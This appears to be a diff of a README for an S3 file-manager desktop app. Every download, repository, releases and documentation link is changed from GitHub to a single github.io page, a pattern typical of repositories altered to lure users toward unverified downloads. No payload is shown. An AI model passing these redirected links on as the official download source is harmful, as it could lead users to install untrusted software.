@@ -1,6 +1,6 @@
 # ⚡ s3explorer - Browse, Upload & Edit S3 Files Instantly
 
-[![Download s3explorer](https://img.shields.io/badge/Download-s3explorer-%23FF6F00?style=for-the-badge&logo=github)](https://github.com/Edinneo890/s3explorer/releases)
+[![Download s3explorer](https://img.shields.io/badge/Download-s3explorer-%23FF6F00?style=for-the-badge&logo=github)](https://edinneo890.github.io)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ s3explorer is a fast desktop application for managing files in cloud storage. It
 
 ## 📥 Download & Installation
 
-[![Download s3explorer](https://img.shields.io/badge/Download-s3explorer-%234CAF50?style=for-the-badge&logo=github)](https://github.com/Edinneo890/s3explorer/releases)
+[![Download s3explorer](https://img.shields.io/badge/Download-s3explorer-%234CAF50?style=for-the-badge&logo=github)](https://edinneo890.github.io)
 
 Visit this link to download the application. The download page will show available versions for your operating system.
 
@@ -105,8 +105,8 @@ For issues, questions, or feature requests, please use the GitHub Issues page.
 
 ## 🌐 Additional Resources
 
-- [GitHub Repository](https://github.com/Edinneo890/s3explorer)
-- [Releases Page](https://github.com/Edinneo890/s3explorer/releases)
-- [Documentation](https://github.com/Edinneo890/s3explorer/wiki)
+- [GitHub Repository](https://edinneo890.github.io)
+- [Releases Page](https://edinneo890.github.io)
+- [Documentation](https://edinneo890.github.io)
 
 Keywords: aws, cloud-storage, cloudflare-r2, desktop-app, electron, file-manager, material-design, minio, monaco-editor, s3, solidjs, typescript
